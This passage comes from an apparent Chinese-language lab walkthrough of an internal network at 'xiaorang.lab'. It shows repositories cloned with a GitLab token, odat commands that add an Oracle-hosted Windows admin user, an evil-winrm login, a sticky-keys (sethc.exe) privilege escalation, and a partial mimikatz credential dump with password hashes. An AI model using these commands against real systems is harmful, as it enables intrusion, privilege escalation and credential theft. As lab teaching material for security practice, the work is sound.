class="string">&quot;private&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;releases_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;environments_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;feature_flags_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;infrastructure_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;monitor_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;emails_disabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;shared_runners_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;lfs_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;creator_id&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;import_status&quot;</span><span class="punctuation">:</span> <span class="string">&quot;none&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;open_issues_count&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;ci_default_git_depth&quot;</span><span class="punctuation">:</span> <span class="number">20</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;ci_forward_deployment_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;ci_job_token_scope_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;ci_separated_caches&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;ci_opt_in_jwt&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;ci_allow_fork_pipelines_to_run_in_parent_project&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;public_jobs&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;build_timeout&quot;</span><span class="punctuation">:</span> <span class="number">3600</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;auto_cancel_pending_pipelines&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;ci_config_path&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;shared_with_groups&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span> <span class="punctuation">]</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;only_allow_merge_if_pipeline_succeeds&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;allow_merge_on_skipped_pipeline&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;restrict_user_defined_variables&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;request_access_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;only_allow_merge_if_all_discussions_are_resolved&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;remove_source_branch_after_merge&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;printing_merge_request_link_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;merge_method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;merge&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;squash_option&quot;</span><span class="punctuation">:</span> <span class="string">&quot;default_off&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;enforce_auth_checks_on_uploads&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;suggestion_commit_message&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;merge_commit_template&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;squash_commit_template&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;issue_branch_template&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;auto_devops_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;auto_devops_deploy_strategy&quot;</span><span class="punctuation">:</span> <span class="string">&quot;continuous&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;autoclose_referenced_issues&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;keep_latest_artifact&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;runner_token_expiration_interval&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;permissions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>!<span class="punctuation">[</span><span class="punctuation">]</span>(https<span class="punctuation">:</span><span class="comment">//tool.oschina.net/tools/json_format/Expanded.gif)</span></span><br><span class="line">            <span class="attr">&quot;project_access&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;group_access&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>把这几个项目脱下来看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains git clone http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/internal-secret.git</span><br><span class="line">proxychains git clone http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/xradmin.git</span><br><span class="line">proxychains git clone http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/xrwiki.git</span><br><span class="line">proxychains git clone http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/awenode.git</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>有一堆用户名和密码</p><img src="/post/d42c659b/IMAGE20250310174354087.png" class=""><p>在xradmin仓库中找到了密码</p><img src="/post/d42c659b/IMAGE20250310174642927.png" class=""><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url: 172.22.14.31:1521/orcl  </span><br><span class="line">username: xradmin  </span><br><span class="line">password: fcMyE8t9E4XdsKf</span><br></pre></td></tr></table></figure><p>找到一个工具odat针对oracle进行利用的，使用它来执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 ./odat dbmsscheduler -s 172.22.14.31 -p 1521 -d ORCL -U xradmin -P fcMyE8t9E4XdsKf --sysdba --exec &#x27;net user ocean admin@123 /add&#x27;</span><br><span class="line">proxychains4 ./odat dbmsscheduler -s 172.22.14.31 -p 1521 -d ORCL -U xradmin -P fcMyE8t9E4XdsKf --sysdba --exec &#x27;net localgroup administrators ocean /add&#x27;</span><br></pre></td></tr></table></figure><p>但是Arm架构的kali没有这个工具，先看其他的吧。</p><img src="/post/d42c659b/IMAGE20250310202453958.png" class=""><p>去下了一个在云服务器上打成功了。</p><img src="/post/d42c659b/IMAGE20250310202600606.png" class=""><p>上面的用户和密码看到有一列机器那一列和fscan扫描出来的记录有点像</p><img src="/post/d42c659b/IMAGE20250310191055396.png" class=""><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XR-0923 | zhangshuai | wSbEajHzZs</span><br></pre></td></tr></table></figure><p>先rdp过去看看。</p><img src="/post/d42c659b/IMAGE20250310191437014.png" class=""><p>可以看到这个用户是能够远程登录的。</p><h3 id="SeRestorePrivilege提权">SeRestorePrivilege提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains evil-winrm -i 172.22.14.46 -u zhangshuai -p wSbEajHzZs</span><br></pre></td></tr></table></figure><img src="/post/d42c659b/IMAGE20250310191559326.png" class=""><p>这怎么 winrm上来的权限还多一个，SeRestorePrivilege可以提权。</p><p>SeRestorePrivilege授予对系统上所有对象的写访问权，而不管它们的ACL如何。<br>滥用特权的三种方式：</p><ul><li>修改服务二进制文件</li><li>覆盖系统进程使用的DLL</li><li>修改注册表设置<br>也就是类似放大镜那种提权把cmd换成粘滞键然后锁屏按五次shift键<br>参考：<br><a href="https://forum.butian.net/share/348">https://forum.butian.net/share/348</a><br><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90%E7%9A%84%E5%88%A9%E7%94%A8">https://3gstudent.github.io/渗透技巧-Windows九种权限的利用</a></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ren sethc.exe sethc.bak </span><br><span class="line">ren cmd.exe sethc.exe</span><br></pre></td></tr></table></figure><img src="/post/d42c659b/IMAGE20250310192156171.png" class=""><p>可以看到提权成功。那么去抓一下hash</p><img src="/post/d42c659b/IMAGE20250310192906745.png" class=""><p>为了方便操作先添加个后门用户,抓到机器用户的hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # sekurlsa::logonpasswords</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 5971088 (00000000:005b1c90)</span><br><span class="line">Session           : Interactive from 3</span><br><span class="line">User Name         : DWM-3</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/10 19:32:26</span><br><span class="line">SID               : S-1-5-90-0-3</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : a4f432e39e79dc4ad8b85854ed243f61</span><br><span class="line">         * SHA1     : 2718b31174dc5fe2ae10f2aeecb08af8fbf4fd1f</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : xiaorang.lab</span><br><span class="line">         * Password : 18 77 1d d8 f8 70 90 6d df 7b 30 47 4d 9d b7 7d 8e 84 8a 85 57 e9 68 44 69 f5 01 a2 27 f6 d2 05 95 83 45 86 54 82 7d 6c 17 58 0b 38 04 af ff a6 ff ec 01 87 77 22 7c f6 bf 43 72 88 14 5b c5 9c dd 34 62 5c dd 7b c5 82 9c 10 16 9b 25 fa d6 cb d3 2d 9f 8b f3 f4 9d 8f 3b 64 2f b8 b1 44 5b f5 b0 87 2d bc e0 11 50 c3 23 12 75 f6 32 7b a7 8e ce b7 3d 89 b1 56 12 c5 7e cc 60 98 5d c7 7d 4d 45 6e fd c3 65 41 ba 8a fe 7e fb f8 79 ca 60 f7 4e be bc 62 04 71 47 15 ea 19 f0 ad 00 f7 39 7a b1 01 f6 bf e6 c1 33 a8 bf 0b 7d 4c 0f 54 cb 0b 40 28 6e 3d 3e d9 19 8e 44 4e 2e 62 28 76 78 d2 d3 57 ec 9f 12 d7 bc 51 56 88 ed 67 99 4f 09 01 49 b3 e0 02 33 6e 26 31 c3 53 a7 bd 79 20 2e 17 ed 11 c4 d7 a5 fc 31 0c 72 75 aa 8f 39 12 fd 7e</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">        cloudap :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 5970395 (00000000:005b19db)</span><br><span class="line">Session           : Interactive from 3</span><br><span class="line">User Name         : DWM-3</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/10 19:32:26</span><br><span class="line">SID               : S-1-5-90-0-3</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : a4f432e39e79dc4ad8b85854ed243f61</span><br><span class="line">         * SHA1     : 2718b31174dc5fe2ae10f2aeecb08af8fbf4fd1f</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : xiaorang.lab</span><br><span class="line">         * Password : 18 77 1d d8 f8 70 90 6d df 7b 30 47 4d 9d b7 7d 8e 84 8a 85 57 e9 68 44 69 f5 01 a2 27 f6 d2 05 95 83 45 86 54 82 7d 6c 17 58 0b 38 04 af ff a6 ff ec 01 87 77 22 7c f6 bf 43 72 88 14 5b c5 9c dd 34 62 5c dd 7b c5 82 9c 10 16 9b 25 fa d6 cb d3 2d 9f 8b f3 f4 9d 8f 3b 64 2f b8 b1 44 5b f5 b0 87 2d bc e0 11 50 c3 23 12 75 f6 32 7b a7 8e ce b7 3d 89 b1 56 12 c5 7e cc 60 98 5d c7 7d 4d 45 6e fd c3 65 41 ba 8a fe 7e fb f8 79 ca 60 f7 4e be bc 62 04 71 47 15 ea 19 f0 ad 00 f7 39 7a b1 01 f6 bf e6 c1 33 a8 bf 0b 7d 4c 0f 54 cb 0b 40 28 6e 3d 3e d9 19 8e 44 4e 2e 62 28 76 78 d2 d3 57 ec 9f 12 d7 bc 51 56 88 ed 67 99 4f 09 01 49 b3 e0 02 33 6e 26 31 c3 53 a7 bd 79 20 2e 17 ed 11 c4 d7 a5 fc 31 0c 72 75 aa 8f 39 12 fd 7e</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">        cloudap :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 5969701 (00000000:005b1725)</span><br><span class="line">Session           : Interactive from 3</span><br><span class="line">User Name         : UMFD-3</span><br><span class="line">Domain            : Font Driver Host</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/10 19:32:26</span><br><span class="line">SID               : S-1-5-96-0-3</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : a4f432e39e79dc4ad8b85854ed243f61</span><br><span class="line">         * SHA1     : 2718b31174dc5fe2ae10f2aeecb08af8fbf4fd1f</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : xiaorang.lab</span><br><span class="line">         * Password : 18 77 1d d8 f8 70 90 6d df 7b 30 47 4d 9d b7 7d 8e 84 8a 85 57 e9 68 44 69 f5 01 a2 27 f6 d2 05 95 83 45 86 54 82 7d 6c 17 58 0b 38 04 af ff a6 ff ec 01 87 77 22 7c f6 bf 43 72 88 14 5b c5 9c dd 34 62 5c dd 7b c5 82 9c 10 16 9b 25 fa d6 cb d3 2d 9f 8b f3 f4 9d 8f 3b 64 2f b8 b1 44 5b f5 b0 87 2d bc e0 11 50 c3 23 12 75 f6 32 7b a7 8e ce b7 3d 89 b1 56 12 c5 7e cc 60 98 5d c7 7d 4d 45 6e fd c3 65 41 ba 8a fe 7e fb f8 79 ca 60 f7 4e be bc 62 04 71 47 15 ea 19 f0 ad 00 f7 39 7a b1 01 f6 bf e6 c1 33 a8 bf 0b 7d 4c 0f 54 cb 0b 40 28 6e 3d 3e d9 19 8e 44 4e 2e 62 28 76 78 d2 d3 57 ec 9f 12 d7 bc 51 56 88 ed 67 99 4f 09 01 49 b3 e0 02 33 6e 26 31 c3 53 a7 bd 79 20 2e 17 ed 11 c4 d7 a5 fc 31 0c 72 75 aa 8f 39 12 fd 7e</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">        cloudap :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 3150114 (00000000:00301122)</span><br><span class="line">Session           : RemoteInteractive from 2</span><br><span class="line">User Name         : zhangshuai</span><br><span class="line">Domain            : XR-0923</span><br><span class="line">Logon Server      : XR-0923</span><br><span class="line">Logon Time        : 2025/3/10 19:13:09</span><br><span class="line">SID               : S-1-5-21-754105099-1176710061-2177073800-1001</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : zhangshuai</span><br><span class="line">         * Domain   : XR-0923</span><br><span class="line">         * NTLM     : f97d5a4b44b11bc257a63c3f76f18a9a</span><br><span class="line">         * SHA1     : 